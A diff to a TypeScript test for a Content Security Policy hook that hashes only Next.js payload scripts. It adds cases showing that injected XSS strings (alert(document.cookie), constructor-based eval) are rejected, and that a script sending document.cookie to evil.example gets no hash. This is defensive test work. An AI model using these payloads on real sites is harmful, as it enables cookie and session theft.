@@ -8,6 +8,7 @@ const require = createRequire(import.meta.url);
 process.env.KKT_CSP_HOOK = "off"; // install() is called explicitly below, for this test's server only
 const hook = require("../csp-hook.cjs") as {
   PLACEHOLDER: string;
+  isFrameworkScript(source: string): boolean;
   inlineScriptHashes(html: string): string[];
   applyHashes(policy: string, html: string): string;
   instrument(req: http.IncomingMessage, res: http.ServerResponse): void;
@@ -28,12 +29,35 @@ const HTML = [
 ].join("");
 
 describe("csp-hook: inline-script hashes", () => {
-  it("hashes every executable inline script once; external scripts and JSON-LD data blocks are not listed", () => {
+  it("hashes every Next.js payload script once; external scripts, JSON-LD data blocks and other inline code are not listed", () => {
     expect(hook.inlineScriptHashes(HTML)).toEqual([
       sha("self.__next_f=self.__next_f||[];self.__next_f.push([0])"),
       sha('self.__next_f.push([1,"a\\u003cb"])'),
-      sha('import("/x.js")'),
     ]);
+  });
+
+  it("only vouches for the RSC payload shape: an inline script injected into the HTML gets no hash (the browser blocks it)", () => {
+    for (const ok of [
+      "(self.__next_f=self.__next_f||[]).push([0])",
+      "(self.__next_f=self.__next_f||[]).push([0]);self.__next_f.push([2,null])",
+      'self.__next_f.push([1,"0:{\\"P\\":null};)]\\u003c/script>"])',
+      'self.__next_f.push([1,"a"]);\nself.__next_f.push([3,"b"])',
+    ])
+      expect(hook.isFrameworkScript(ok), ok).toBe(true);
+    for (const bad of [
+      "alert(document.cookie)",
+      'self.__next_f.push([1,"x"]);alert(1)',
+      'self.__next_f.push([1,"x"]),alert(1)',
+      "self.__next_f.push([1,alert(1)])",
+      "self.__next_f.push({})",
+      "self.__next_f=self.__next_f||[].constructor.constructor('alert(1)')()",
+      'self.__next_f.push([1,"x"])//',
+      "",
+    ])
+      expect(hook.isFrameworkScript(bad), bad).toBe(false);
+    const injected = `${HTML.replace("</body>", "<script>fetch('//evil.example/'+document.cookie)</script></body>")}`;
+    expect(hook.inlineScriptHashes(injected)).toEqual(hook.inlineScriptHashes(HTML));
+    expect(hook.applyHashes(POLICY, injected)).not.toContain(sha("fetch('//evil.example/'+document.cookie)"));
   });
 
   it("replaces the placeholder in the policy (and drops it for a page without inline scripts)", () => {
